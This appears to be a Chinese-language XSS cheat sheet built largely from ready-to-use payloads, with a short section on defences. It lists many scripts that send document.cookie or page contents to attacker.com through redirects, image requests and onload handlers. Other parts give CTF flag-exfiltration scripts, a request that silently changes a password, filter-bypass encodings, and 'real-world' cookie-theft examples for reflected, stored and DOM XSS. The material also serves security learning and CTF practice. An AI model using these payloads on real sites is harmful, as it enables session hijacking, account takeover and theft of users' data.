# XSS (跨站脚本攻击) 完全指南

## 目录
> [基础概念](#基础概念)<br>
> [XSS 类型](#xss-类型)<br>
> [Payload 集合](#payload-集合)<br>
> [漏洞挖掘](#漏洞挖掘)<br>
> [防御措施](#防御措施)<br>
> [实战案例](#实战案例)<br>
> [绕过技巧](#绕过技巧)

## 基础概念

XSS (Cross-Site Scripting) 是一种常见的 Web 安全漏洞，攻击者通过在网页中注入恶意脚本，使得其他用户在访问该页面时执行这些脚本。

### XSS 的危害
> 窃取用户 Cookie<br>
> 劫持用户会话<br>
> 修改网页内容<br>
> 钓鱼攻击<br>
> 传播恶意软件

## XSS 类型

**反射型 XSS**

> 恶意脚本通过 URL 参数等方式注入<br>
> 服务器将恶意脚本反射回浏览器执行<br>
> 通常需要用户点击特定链接才能触发

 **存储型 XSS**

> 恶意脚本被永久存储在服务器上<br>
> 当其他用户访问包含恶意脚本的页面时触发<br>
> 影响范围更大，危害更严重

 **DOM 型 XSS**

> 完全在客户端执行<br>
> 不依赖服务器响应<br>
> 通过修改 DOM 结构触发

## Payload 集合

### 1. 基础 Payloads

#### 1.1 基本弹窗
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

#### 1.2 闭合标签
```html
'><script>alert('XSS')</script>
"><script>alert('XSS')</script>
```

#### 1.3 事件处理器
```html
<img src=x onerror=alert('XSS')>
<div onmouseover="alert('XSS')">hover me</div>
```

### 2. 高级攻击脚本

#### 2.1 基础脚本标签
```html
<!-> 基本弹窗 -->
<script>alert("hello")</script>   <!-> 弹出hello -->
<script>alert(/hello/)</script>   <!-> 弹出hello -->
<script>alert(1)</script>        <!-> 弹出1,对于数字可以不用引号 -->
<script>alert(document.cookie)</script>      <!-> 弹出cookie -->
<script src=http://xxx.com/xss.js></script>  <!-> 引用外部的xss -->
```

#### 2.2 数据窃取脚本
```html
<!-> 使用 window.location.href -->
<script>window.location.href="http://attacker.com/collect?cookie="+document.cookie</script>

<!-> 使用 document.location.href -->
<script>document.location.href="http://attacker.com/collect?cookie="+document.cookie</script>

<!-> 使用 window.open -->
<script>window.open="http://attacker.com/collect?cookie="+document.cookie</script>

<!-> 获取特定元素内容 -->
<script>window.location.href="http://attacker.com/collect?data="+document.getElementsByClassName('target-class')[0].innerHTML</script>

<!-> 使用 jQuery 选择器 -->
<script>$('div.layui-table-cell.laytable-cell-1-0-1').each(function(index,value){
    if(value.innerHTML.indexOf('ctfshow{')>-1){
        window.location.href='http://attacker.com/'+value.innerHTML;
    }
});</script>

<!-> 使用 jQuery 选择器（带过滤） -->
<script>$('div.layui-table-cell.laytable-cell-1-0-1').each(function (index, value) {
    if ((value.innerHTML.indexOf('ctfshow{') > -1)&&(value.innerHTML.indexOf('script') === -1)) {
        window.location.href = 'http://attacker.com/' +value.innerHTML;
    }
});</script>

<!-> 使用 querySelector -->
<script>var img = new Image();
img.src = "http://attacker.com/"+document.querySelector('#top > div.layui-container > div:nth-child(4) > div > div.layui-table-box > div.layui-table-body.layui-table-main').textContent;
document.body.append(img);</script>
```

#### 2.3 特殊标签利用
```html
<!-> SVG 标签 -->
<svg onload="alert(1)">
<svg onload="alert(1)"//
<svg onload="location.href='http://attacker.com/collect?c='+document.cookie"/>

<!-> Body 标签 -->
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onload=location.href='http://attacker.com/collect?cookie='+document.cookie></body>
<body/**/onload=location.href='http://attacker.com/collect?cookie='+document.cookie></body>
<body/onload=location.href='http://attacker.com/collect?cookie='+document.cookie></body>

<!-> Video 标签 -->
<video onloadstart=alert(1) src="/media/hack-the-planet.mp4" />

<!-> Style 标签 -->
<style onload=alert(1)></style>

<!-> Iframe 标签 -->
<iframe onload=document.location='http://attacker.com/collect?cookie='+document.cookie>'
```

#### 2.4 特殊场景 Payloads
```html
<!-> 使用 Image 对象 -->
<script>var img = new Image();img.src = "http://attacker.com/"+document.cookie;</script>

<!-> 使用 XMLHttpRequest -->
<script>
var httpRequest = new XMLHttpRequest();
httpRequest.open('POST', 'http://attacker.com/api/change.php', true);
httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");
httpRequest.send('p=1234567');
</script>

<!-> 使用 jQuery AJAX -->
<script>$.ajax({
    url:"api/amount.php",
    method:"POST",
    data:{'u':'1','a':''}
})</script>

<!-> 使用 jQuery AJAX 修改密码 -->
<script>$.ajax({
    url:"api/change.php",
    method:"POST",
    data:{'p':'1717'}
})</script>

<!-> 使用 jQuery AJAX 修改金额 -->
<script>$.ajax({
    url:"api/amount.php",
    method:"POST",
    data:{'u':'1','a':''}
})</script>
```

#### 2.5 监控脚本
```javascript
// 使用 nc 监控
<script>window.open('http://attacker.com:9033/'+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script>

// 使用 jQuery 监控
<script>$('div.layui-table-cell.laytable-cell-1-0-1').each(function(index,value){
    if(value.innerHTML.indexOf('ctfshow{')>-1){
        window.location.href='http://attacker.com:9033/'+value.innerHTML;
    }
});</script>

// 使用 jQuery 监控（带过滤）
<script>$('div.layui-table-cell.laytable-cell-1-0-1').each(function (index, value) {
    if ((value.innerHTML.indexOf('ctfshow{') > -1)&&(value.innerHTML.indexOf('script') === -1)) {
        window.location.href = 'http://attacker.com:9033/' +value.innerHTML;
    }
});</script>
```

### 3. 绕过技巧

#### 3.1 标签名绕过
```html
<!-> 大小写混淆 -->
<iMg onerror=alert(1) src=a>

<!-> 插入 NULL 字节 -->
<%00img onerror=alert(1) src=a>

<!-> 空格替代字符 -->
<img%09onerror=alert(1) src=a>  <!-> Tab -->
<img%0aonerror=alert(1) src=a>  <!-> 换行 -->
<img/"onerror=alert(1) src=a>   <!-> 异常语法 -->
```

#### 3.2 属性名绕过
```html
<img o%00nerror=alert(1) src=a>
<imgonerror='alert(1)'src=a>
```

#### 3.3 属性值编码绕过
```html
<imgonerror=a%00lert(1) src=a>
<imgonerror=a&#x006c;ert(1) src=a>
```

#### 3.4 可编码属性
##### URL 类型属性（支持 `javascript:` 协议）
> `href=`<br>
> `action=`<br>
> `formaction=`<br>
> `location=`<br>

##### 资源加载类属性（支持 base64 或外链）
> `src=` <br>
> `data=` <br>
> `poster=` <br>
> `background=` <br>
> `code=` <br>

##### 脚本执行类属性
> `on*=` 所有以 `on` 开头的事件处理属性

#### 3.5 字符集与长度限制绕过

##### 使用非标准编码
> UTF-7<br>
> US-ASCII<br>
> UTF-16

##### 拆分跨站脚本（用于绕过长度限制）
```javascript
<script>
  z='<script src=';
  z+='test.c';
  z+='n/1.js><\/script>';
  document.write(z);
</script>
```
执行结果为：
```html
<script src=test.cn/1.js></script>
```

##### JavaScript 层面的绕过技巧
```javascript
<!-> Unicode 编码关键字 -->
<script>a\u006cert(1)</script>
<script>eval('a\u006cert(1)')</script>

<!-> 替代点操作符 -->
<script>alert(document['cookie'])</script>
<script>with(document)alert(cookie)</script>
```

### 4. XSS 可插入位置

```html
<!-> 用户输入作为 script 标签内容 -->
<script>用户输入</script>

<!-> 用户输入作为 HTML 注释 -->
<!-> 用户输入 -->
<!-> --><script>alert('hack')</script><!-> -->

<!-> 用户输入作为标签属性名 -->
<div 用户输入="xx"></div>
<div ></div><script>alert('hack')</script><div a="xx"></div>

<!-> 用户输入作为标签属性值 -->
<div id="用户输入"></div>
<div id=""></div><script>alert('hack')</script><div a="x"></div>

<!-> 用户输入作为标签名 -->
<用户输入 id="xx" />
<><script>alert('hack')</script><b id="xx" />

<!-> 用户输入作为 CSS 内容 -->
<style>用户输入</style>
<style></style><script>alert('hack')</script><style></style>
```

### 5. 漏洞挖掘

#### 5.1 黑盒测试
> URL 参数<br>
> 表单输入<br>
> 搜索框<br>
> 评论系统<br>
> 个人信息页面

#### 5.2 白盒测试
> 检查输入处理函数<br>
> 检查输出编码<br>
> 检查 DOM 操作<br>
> 检查 JavaScript 事件处理

#### 5.3 常见业务场景
> 重灾区：评论区、留言区、个人信息、订单信息等<br>
> 针对型：站内信、网页即时通讯、私信、意见反馈<br>
> 存在风险：搜索框、当前目录、图片属性等

#### 5.4 漏洞查找方法
##### 基本验证
```javascript
"><script>alert(document.cookie)</script>
"><ScRiPt>alert(document.cookie)</ScRiPt>
"%3e%3cscript%3ealert(document.cookie)%3c/script%3e
"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%00"><script>alert(document.cookie)</script>
```

##### DOM 型 XSS 查找
检查以下危险的 DOM 属性和 API：
> `document.location`<br>
> `document.URL`<br>
> `document.URLUnencoded`<br>
> `document.referrer`<br>
> `window.location`<br>

检查以下危险的 JavaScript 操作：
> `document.write()` / `document.writeln()`<br>
> `document.body.innerHTML`<br>
> `eval()`<br>
> `window.execScript()`<br>
> `window.setInterval()` / `window.setTimeout()`

### 6. 防御措施

#### 6.1 输入验证
> 长度限制<br>
> 字符白名单<br>
> 正则表达式过滤

#### 6.2 输出编码
> HTML 实体编码<br>
> JavaScript 编码<br>
> URL 编码

#### 6.3 安全响应头
> Content-Security-Policy<br>
> X-XSS-Protection<br>
> X-Content-Type-Options

#### 6.4 其他措施
> 使用 HttpOnly Cookie<br>
> 实施 CSRF 令牌<br>
> 使用安全的框架和库

#### 6.5 DOM 型防御
```javascript
// 输入验证
var a = document.URL;
a = a.substring(a.indexOf("message=") + 8);
a = unescape(a);
var regex = /^([A-Za-z0-9\s]+)$/;
if (regex.test(a)) {
    document.write(a);
}

// 输出编码
function reinit(str) {
    var d = document.createElement('div');
    d.appendChild(document.createTextNode(str));
    return d.innerHTML;
}
```

### 7. 实战案例

#### 7.1 反射型 XSS 利用
```html
<script>document.location.href='https://attacker.com/steal?cookie='+document.cookie</script>
```

#### 7.2 存储型 XSS 利用
```html
<img src="" onerror=location.href="https://attacker.com/steal?cookie="+document.cookie>
```

#### 7.3 DOM 型 XSS 利用
```html
<script>
$('div.layui-table-cell').each(function(index,value){
    if(value.innerHTML.indexOf('flag{')>-1){
        window.location.href='http://attacker.com/'+value.innerHTML;
    }
});
</script>
```

## 参考资源
1. [DVWA XSS 学习指南](https://blog.csdn.net/weixin_40950781/article/details/100007103)
2. [XSS 漏洞详解](https://blog.csdn.net/qq_61553520/article/details/130268475)
3. [XSS 防御最佳实践](https://cloud.tencent.com/developer/article/1790802)
4. [XSS 靶场](http://ctf.aabyss.cn/xss-labs/index.php) 